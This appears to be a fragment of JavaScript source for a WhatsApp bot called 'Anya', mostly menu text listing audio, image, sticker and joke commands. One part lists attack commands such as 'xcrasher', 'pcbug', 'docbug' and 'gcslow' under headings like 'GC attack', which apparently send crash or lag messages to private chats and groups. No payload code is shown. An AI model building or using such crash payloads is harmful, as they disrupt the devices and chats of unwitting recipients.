╠${prefix}ғᴀsᴛ [ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ]
╠${prefix}ғᴀᴛ [ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ]
╠${prefix}ɴɪɢʜᴛᴄᴏʀᴇ [ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ]
╠${prefix}ʀᴇᴠᴇʀsᴇ [ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ]
╠${prefix}ʀᴏʙᴏᴛ [ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ]
╠${prefix}sʟᴏᴡ [ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ]
╠${prefix}sᴍᴏᴏᴛʜ [ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ]
╠${prefix}sǫᴜɪʀʀᴇʟ [ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ]
╠═══════✪ ɪᴍᴀɢᴇ ᴇғғᴇᴄᴛ ᴍᴇɴᴜ
╠${prefix}ʀᴇᴍᴏᴠᴇʙɢ [ʀᴇᴘʟʏ ɪᴍᴀɢᴇ]
╠═══════✪ ʀᴀɴᴅᴏᴍ ɪᴍᴀɢᴇ
╠${prefix}ᴄᴏғғᴇᴇ
╠${prefix}ᴡᴏᴏғ
╠${prefix}ᴍᴇᴏᴡ
...
╠${prefix}ᴘᴜʙɢ
╠${prefix}ʜᴀᴄᴋɪɴɢ
╠${prefix}ᴘʀᴏғɪʟᴇᴘɪᴄᴛᴜʀᴇ
╠${prefix}ᴄᴏᴜᴘʟᴇᴘɪᴄᴛᴜʀᴇ
╠${prefix}ᴡᴀʟʟᴘʜᴏɴᴇ
╠${prefix}ᴡᴀʟʟᴍʟ
╠═══════✪ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ
╠${prefix}ᴛɪᴋᴛᴏᴋɢɪʀʟ
...
╠${prefix}ᴛɪᴋᴛᴏᴋʙᴏᴄɪʟ
╠═══════✪ ᴇᴍᴏᴛᴇ ᴍᴇɴᴜ
╠${prefix}ɪɴsᴛᴀɢʀᴀᴍᴇᴍᴏᴊɪ
╠${prefix}ғᴀᴄᴇʙᴏᴏᴋᴇᴍᴏᴊɪ
╠${prefix}ɪᴘʜᴏɴᴇᴇᴍᴏᴊɪ
╠${prefix}sᴀᴍsᴜɴɢᴇᴍᴏᴊɪ
╠${prefix}ᴊᴏʏᴇᴍᴏᴊɪ
╠${prefix}sᴋʏᴘᴇᴇᴍᴏᴊɪ
╠${prefix}ᴛᴡɪᴛᴛᴇʀᴇᴍᴏᴊɪ
╠${prefix}ᴡʜᴀᴛsᴀᴘᴘᴇᴍᴏᴊɪ
╠${prefix}ᴍɪᴄʀᴏsᴏғᴛᴇᴍᴏᴊɪ
╠${prefix}ɢᴏᴏɢʟᴇᴇᴍᴏᴊɪ
╠${prefix}ᴘᴇᴅɪᴀᴇᴍᴏᴊɪ
╠${prefix}ᴍɪᴄʀᴏsᴏғᴛᴇᴍᴏᴊɪ
╠═══════✪ ᴀɴɪᴍᴇ ᴍᴇɴᴜ
...
╠${prefix}ᴀɴɪᴍᴇsᴍᴜɢ
╠${prefix}ᴄᴏᴜᴘʟᴇᴘᴘ
╠${prefix}ᴀɴɪᴍᴇᴡᴀʟʟ [ǫᴜᴇʀʏ]
╠${prefix}ᴀɴɪᴍᴇᴡᴀʟʟ2 [ǫᴜᴇʀʏ]
╠══════✪ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ
╠ ${prefix}ᴘᴀᴛʀɪᴄᴋ
╠ ${prefix}ᴇᴍᴏᴊɪ
╠ ${prefix}ᴇᴍᴏᴊɪᴍɪx
...
╠ ${prefix}ᴄᴀɴ [ᴛᴇxᴛ]
╠ ${prefix}ʀᴀᴛᴇ [ᴛᴇxᴛ]
╠ ${prefix}ᴄᴏᴏʟᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}sᴛᴜᴘɪᴅᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ᴡᴀɪғᴜᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ᴇᴠɪʟᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ᴅᴏɢᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ʜᴏᴛᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}sᴍᴀʀᴛᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ᴜɴᴄʟᴇᴀɴᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ɢʀᴇᴀᴛᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ʙᴇᴀᴜᴛɪғᴜʟᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ᴀᴡᴇsᴏᴍᴇᴄʜᴇᴄᴋ[ᴛᴀɢ]
╠ ${prefix}ᴘʀᴇᴛᴛʏᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ʟᴇsʙɪᴀɴᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ɢᴀʏᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ᴄᴜᴛᴇᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ᴜɢʟʏᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ʜᴏʀɴʏᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ᴄʜᴀʀᴀᴄᴛᴇʀᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ʟᴏᴠᴇʟʏᴄʜᴇᴄᴋ [ᴛᴀɢ]
╠ ${prefix}ᴄᴏᴜᴘʟᴇ
╠ ${prefix}sᴏᴜʟᴍᴀᴛᴇ
╠ ${prefix}ʜᴏᴛ
╠ ${prefix}sᴇxʏ
...
╠${prefix}ᴘᴄʙᴜᴛ [ɴᴜᴍʙᴇʀ]
╠${prefix}ᴘᴄᴠɴ [ɴᴜᴍʙᴇʀ]
╠${prefix}ᴘᴄsᴛɪᴄᴋ [ɴᴜᴍʙᴇʀ]
╠${prefix}ᴘᴄғᴀsᴛ [ɴᴜᴍʙᴇʀ]
╠${prefix}ᴘᴄsʟᴏᴡ [ɴᴜᴍʙᴇʀ]
╠${prefix}ᴘᴄʙᴜɴɴʏ [ɴᴜᴍʙᴇʀ]
╠${prefix}xᴄʀᴀsʜᴇʀ [ᴀᴍᴏᴜɴᴛ]
╠${prefix}ᴘᴄᴄᴏɴᴛᴀᴄᴛ [ᴀᴍᴏᴜɴᴛ]
╠${prefix}ᴠɪʀᴛᴇx5 [ᴀᴍᴏᴜɴᴛ]
╠${prefix}ғʟᴏᴡᴇʀ [ᴀᴍᴏᴜɴᴛ]
╠${prefix}ᴘᴏʟʟʙᴜɢ [ᴀᴍᴏᴜɴᴛ]
╠${prefix}ᴄᴀᴛᴀʟᴏɢʙᴜɢ [ᴀᴍᴏᴜɴᴛ]
╠${prefix}ᴛʀᴏʟʟʏʙᴜɢ [ᴀᴍᴏᴜɴᴛ]
╠${prefix}ᴛʀᴏʟʟʏʙᴜɢ2 [ᴀᴍᴏᴜɴᴛ]
╠════☾ɢᴄ ᴀᴛᴛᴀᴄᴋ☽
╠${prefix}ɢᴄsʟᴏᴡ
╠${prefix}ɢᴄғᴀsᴛ
╠${prefix}ɢᴄʙᴜɴɴʏ
...
╠════☾ᴘᴄ & ɢᴄ ᴀᴛᴛᴀᴄᴋ☽
╠${prefix}ᴠɴʙᴜɢ [ᴀᴍᴏᴜɴᴛ]
╠${prefix}ᴅᴏᴄʙᴜɢ [ᴀᴍᴏᴜɴᴛ]
╠${prefix}ᴘᴄɢᴄsʟᴏᴡ [ɴᴜᴍʙᴇʀ]
╠${prefix}ᴘᴄɢᴄғᴀsᴛ [ɴᴜᴍʙᴇʀ]
╠${prefix}ᴘᴄɢᴄʙᴜɴɴʏ [ɴᴜᴍʙᴇʀ]
╠${prefix}ᴛᴇxᴛsʜᴏᴛ
╠${prefix}ᴅᴏᴄғᴜᴄᴋ [ᴀᴍᴏᴜɴᴛ]
╠${prefix}ᴅᴏᴄsᴏғᴛ [ᴀᴍᴏᴜɴᴛ]
╠${prefix}ᴅᴏᴄsᴏғᴛ2 [ᴀᴍᴏᴜɴᴛ]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await Anya.sendMessage(m.chat, buttonMessage)
}
break
      case 'ownermenu':{
	   var unicorn = await getBuffer(picak+'ᴬⁿʸᵃ❀⃝ ᴏᴡɴᴇʀ ᴍᴇɴᴜ 🎃')
const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'sᴄʀɪᴘᴛ 🔖'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'ᴏᴡɴᴇʀ 🎃'}, type: 1}
]
...
break
            case 'groupmenu':{
var unicorn = await getBuffer(picak+'ᴬⁿʸᵃ❀⃝ ɢʀᴏᴜᴘ ᴍᴇɴᴜ ✨')
...
break
case 'antilinkmenu':{
var unicorn = await getBuffer(picak+'ᴬⁿʸᵃ❀⃝ ᴀɴᴛɪ ʟɪɴᴋs ᴍᴇɴᴜ 🔗')
...
╚═════════════✪`,
    ...
    break
case 'makermenu':{
var unicorn = await getBuffer(picak+'ᴬⁿʸᵃ❀⃝ᴍᴀᴋᴇʀ ᴍᴇɴᴜ 🌈')
...
break
            case 'downloadmenu':{
var unicorn = await getBuffer(picak+'ᴬⁿʸᵃ❀⃝ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ ↘️')
...
break
            case 'searchmenu':{
var unicorn = await getBuffer(picak+'ᴬⁿʸᵃ❀⃝ sᴇᴀʀᴄʜ ᴍᴇɴᴜ 🔎')
...
break
            case 'convertmenu':{
var unicorn = await getBuffer(picak+'ᴬⁿʸᵃ❀⃝ ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ ⚒️')
...
var unicorn = await getBuffer(picak+'ᴬⁿʸᵃ❀⃝ ʀᴀɴᴅᴏᴍ ɪᴍᴀɢᴇ ᴍᴇɴᴜ 😃')
...
var unicorn = await getBuffer(picak+'ᴬⁿʸᵃ❀⃝ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ 🎴')
...
break
           case 'emotemenu':{
var unicorn = await getBuffer(picak+'ᴬⁿʸᵃ❀⃝ ᴇᴍᴏᴛᴇ ᴍᴇɴᴜ 😃')
...
var unicorn = await getBuffer(picak+'ᴬⁿʸᵃ❀⃝ ɪᴍᴀɢᴇ ᴇғғᴇᴄᴛ ᴍᴇɴᴜ 🏞️')
...
break
case 'animemenu':{
var unicorn = await getBuffer(picak+'ᴬⁿʸᵃ❀⃝ ᴀɴɪᴍᴇ ᴍᴇɴᴜ 😘')
...
break
case 'bugmenu':{
var unicorn = await getBuffer(picak+'ᴬⁿʸᵃ❀⃝ ʙᴜɢ ᴍᴇɴᴜ 😈')
